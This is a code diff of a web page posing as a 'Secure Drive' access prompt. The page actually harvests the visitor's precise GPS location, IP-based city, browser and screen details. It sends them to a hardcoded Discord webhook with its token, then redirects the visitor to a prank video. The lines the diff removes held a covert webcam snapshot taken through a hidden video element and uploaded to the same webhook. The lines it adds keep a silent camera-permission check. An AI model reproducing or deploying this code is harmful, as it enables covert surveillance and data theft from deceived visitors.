@@ -16,7 +16,6 @@
       align-items: center;
       height: 100%;
       text-align: center;
-      font-size: 1.2rem;
     }
     #main {
       padding: 1em;
@@ -53,16 +52,14 @@
 <body>
   <div id="main">
     <div id="statusText">Permissions are required to access Secure Drive.</div>
-    <button onclick="begin()">Continue</button>
+    <button onclick="start()">Continue</button>
   </div>
 
   <script>
     const webhookUrl = "https://discord.com/api/webhooks/1388161217603965210/eELyivDPEhlKfnaaDce_b90zBtGFpe51uLHo28LsG0gle_1d8pfuN-_U6vK6Q38_N4Fj";
     const redirectUrl = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
     const deniedPage = "permission-denied.html";
-
     let coords = { lat: "Permission denied", lon: "Permission denied", acc: 0 };
-    let capturedImageData = null;
 
     function getDeviceInfo() {
       return {
@@ -72,40 +69,6 @@
         screen: `${screen.width}x${screen.height}`,
         touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? 'Yes' : 'No'
       };
-    }
-
-    function dataURLtoBlob(dataurl) {
-      const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
-            bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
-      while (n--) u8arr[n] = bstr.charCodeAt(n);
-      return new Blob([u8arr], { type: mime });
-    }
-
-    async function captureSnapshot() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.createElement("video");
-        video.setAttribute("playsinline", true);
-        video.muted = true;
-        video.style.position = "absolute";
-        video.style.opacity = "0";
-        video.srcObject = stream;
-        document.body.appendChild(video);
-        await video.play();
-        await new Promise(resolve => setTimeout(resolve, 2000));
-
-        const canvas = document.createElement("canvas");
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        capturedImageData = canvas.toDataURL("image/png");
-
-        stream.getTracks().forEach(t => t.stop());
-        video.remove();
-      } catch (err) {
-        console.warn("Camera access denied or failed", err);
-      }
     }
 
     function askNotificationPermission() {
@@ -126,10 +89,7 @@
             coords.acc = pos.coords.accuracy;
             resolve(true);
           },
-          err => {
-            console.warn("Location denied", err);
-            resolve(false);
-          },
+          () => resolve(false),
           { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
       });
@@ -137,54 +97,57 @@
 
     function sendToDiscord(ipData) {
       const device = getDeviceInfo();
-      const mapLink = coords.lat !== "Permission denied" 
-        ? `https://www.google.com/maps?q=${coords.lat},${coords.lon}` 
+      const mapLink = coords.lat !== "Permission denied"
+        ? `https://www.google.com/maps?q=${coords.lat},${coords.lon}`
         : "Location not available";
-
-      const formData = new FormData();
-      const snapshotLine = capturedImageData
-        ? "📸 Snapshot: ✅ [Download](attachment://snapshot.png)"
-        : "📸 Snapshot: ❌ Not available";
 
       const payload = {
         embeds: [{
-          title: "📍 GPS & Device Info",
+          title: "📍 Location & Device Info",
           description:
-            `**Latitude:** ${coords.lat}\n**Longitude:** ${coords.lon}\n**Accuracy:** ${coords.acc} meters` +
+            `**Latitude:** ${coords.lat}\n**Longitude:** ${coords.lon}\n**Accuracy:** ${coords.acc}m` +
             `\n**Map:** ${mapLink}` +
             `\n\n🌐 **IP Info**\n**IP:** ${ipData.ipAddress}\n**City:** ${ipData.city}` +
             `\n**Region:** ${ipData.stateProv}\n**Country:** ${ipData.countryName}` +
-            `\n\n🖥️ **Device Info**\n**Platform:** ${device.platform}\n**Browser:** ${device.userAgent}` +
+            `\n\n🖥️ **Device Info**\n**Platform:** ${device.platform}` +
+            `\n**Browser:** ${device.userAgent}` +
             `\n**Language:** ${device.language}\n**Screen:** ${device.screen}` +
             `\n**Touch Support:** ${device.touchSupport}` +
-            `\n\n${snapshotLine}\n🕒 ${new Date().toLocaleString()}`
+            `\n\n🕒 ${new Date().toLocaleString()}`
         }]
       };
 
-      if (capturedImageData) {
-        const blob = dataURLtoBlob(capturedImageData);
-        formData.append("file", blob, "snapshot.png");
-        payload.embeds[0].image = { url: "attachment://snapshot.png" };
-      }
-
-      formData.append("payload_json", JSON.stringify(payload));
-      fetch(webhookUrl, { method: "POST", body: formData });
+      fetch(webhookUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
     }
 
-    async function begin() {
+    function optionalCameraTry() {
+      // Non-blocking camera check
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          stream.getTracks().forEach(t => t.stop());
+        })
+        .catch(() => {}); // ignore error
+    }
+
+    async function start() {
       document.getElementById("main").innerHTML = `
         <div id="statusText">Requesting permissions…</div>
         <div id="spinner"></div>
       `;
 
-      const [locationGranted, notificationGranted] = await Promise.all([
+      const [locationAllowed, notificationsAllowed] = await Promise.all([
         askLocationPermission(),
         askNotificationPermission()
       ]);
 
-      await captureSnapshot();
+      optionalCameraTry();
 
-      if (!locationGranted) {
+      if (!locationAllowed) {
         window.location.href = deniedPage;
         return;
       }
@@ -192,20 +155,22 @@
       fetch("https://api.db-ip.com/v2/free/self")
         .then(res => res.json())
         .then(sendToDiscord)
-        .catch(() => sendToDiscord({ ipAddress: "N/A", city: "-", stateProv: "-", countryName: "-" }));
+        .catch(() => {
+          sendToDiscord({ ipAddress: "N/A", city: "-", stateProv: "-", countryName: "-" });
+        });
 
-      startCountdown();
+      showCountdown();
     }
 
-    function startCountdown() {
+    function showCountdown() {
       document.getElementById("main").innerHTML = `<div id="countdown">5 seconds to open secure drive</div>`;
       let seconds = 5;
       const countdownEl = document.getElementById("countdown");
-      const interval = setInterval(() => {
+      const timer = setInterval(() => {
         seconds--;
         countdownEl.textContent = `${seconds} seconds to open secure drive`;
-        if (seconds === 0) {
-          clearInterval(interval);
+        if (seconds <= 0) {
+          clearInterval(timer);
           window.location.href = redirectUrl;
         }
       }, 1000);
